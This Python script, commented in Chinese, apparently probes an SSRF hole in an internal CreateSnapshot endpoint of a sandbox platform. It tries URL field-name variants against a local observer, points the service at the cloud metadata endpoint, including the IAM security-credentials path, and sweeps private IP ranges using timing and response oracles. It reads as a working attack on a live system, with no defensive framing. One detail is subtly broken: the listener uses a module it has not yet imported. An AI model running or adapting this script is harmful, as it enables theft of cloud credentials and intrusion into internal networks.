# -*- coding: utf-8 -*-
"""create_snap_ssrf: CreateSnapshot base_url SSRF 真调测试
1) 本地观测 HTTP server(18080): 若 celld fetch 发生在 guest 内 -> 收到请求
2) 字段名变体探测: baseUrl/base_url/url/image/ref + 观测目标
3) IMDS 探测: 169.254.169.254 (host 侧 SSRF 判据)
4) 内网 IP 差异探测: 10.0.0.0/8, 172.16-31, 192.168 + 响应时间/内容 oracle
输出落盘 + 哨兵 SNAPSSRF_DONE"""
import socket, json, time, threading, os, sys

OUT = '/vercel/sandbox/snap_ssrf.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


# ---- 本地观测服务器 ----
OBSERVED = []
def make_handler():
    import http.server
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            OBSERVED.append(('GET', self.path, dict(self.headers)))
            self.send_response(200)
            self.send_header('Content-Length', '2')
            self.end_headers()
            self.wfile.write(b'ok')
        def do_POST(self):
            ln = int(self.headers.get('Content-Length', 0) or 0)
            body = self.rfile.read(ln) if ln else b''
            OBSERVED.append(('POST', self.path, dict(self.headers), body[:200]))
            self.send_response(200)
            self.send_header('Content-Length', '2')
            self.end_headers()
            self.wfile.write(b'ok')
        def log_message(self, *a):
            pass
    return H

srv = None
try:
    srv = http.server.HTTPServer(('127.0.0.1', 18080), make_handler())
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    log('local observe server on 127.0.0.1:18080')
except Exception as e:
    log('observe server FAIL: %s' % e)


def http_post(port, path, body='{}', t=5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(('127.0.0.1', port))
        req = ('POST %s HTTP/1.1\r\nHost: 127.0.0.1:%d\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, port, len(body)))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:600].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


CREATE = '/vercel.hive.celld.api.v1.ContainersService/CreateSnapshot'

log('=== PHASE1 基线: CreateSnapshot 空 body ===')
for body in ['{}', '{"name":"x"}', '{"image":"x"}']:
    st, bd = http_post(23456, CREATE, body)
    log('base %s -> %s | %s' % (body[:40], st, bd[:200].replace('\n', ' ')))
    time.sleep(1.0)

log('=== PHASE2 字段变体 -> 本地观测(18080) ===')
field_variants = ['baseUrl', 'base_url', 'baseURL', 'url', 'image', 'imageUrl', 'image_url',
                  'repo', 'repository', 'ref', 'registry', 'source', 'location', 'uri']
for i, fld in enumerate(field_variants):
    body = '{"%s":"http://127.0.0.1:18080/probe/%d/%s"}' % (fld, i, fld)
    st, bd = http_post(23456, CREATE, body)
    obs = OBSERVED[-3:]
    log('field %-12s -> %s | %s | obs=%d' % (fld, st, bd[:180].replace('\n', ' '), len(OBSERVED)))
    time.sleep(1.0)

log('=== PHASE3 IMDS 探测 ===')
for fld in ['baseUrl', 'base_url']:
    for i, url in enumerate(['http://169.254.169.254/latest/meta-data/',
                             'http://169.254.169.254/latest/meta-data/iam/security-credentials/']):
        body = '{"%s":"%s"}' % (fld, url)
        t0 = time.time()
        st, bd = http_post(23456, CREATE, body, t=8)
        dt = time.time() - t0
        log('IMDS %s[%d] -> %s (%.1fs) | %s' % (fld, i, st, dt, bd[:300].replace('\n', ' ')))
        time.sleep(1.0)

log('=== PHASE4 内网网段差异探测 (时间/响应 oracle) ===')
targets = ['http://10.0.0.1/', 'http://10.255.255.1/', 'http://172.16.0.1/', 'http://172.31.255.254/',
           'http://192.168.0.1/', 'http://100.64.0.1/', 'http://8.8.8.8/']
for i, url in enumerate(targets):
    body = '{"baseUrl":"%s"}' % url
    t0 = time.time()
    st, bd = http_post(23456, CREATE, body, t=6)
    dt = time.time() - t0
    log('net %-28s -> %s (%.1fs) | %s' % (url, st, dt, bd[:150].replace('\n', ' ')))
    time.sleep(0.8)

log('=== PHASE5 观测服务器收到 ===')
if OBSERVED:
    for o in OBSERVED:
        log('OBS %s %s' % (o[0], o[1]))
else:
    log('OBS none -> celld fetch 不在 guest 网络空间(可能 host 侧或字段名不对)')

log('SNAPSSRF_DONE')
f.close()
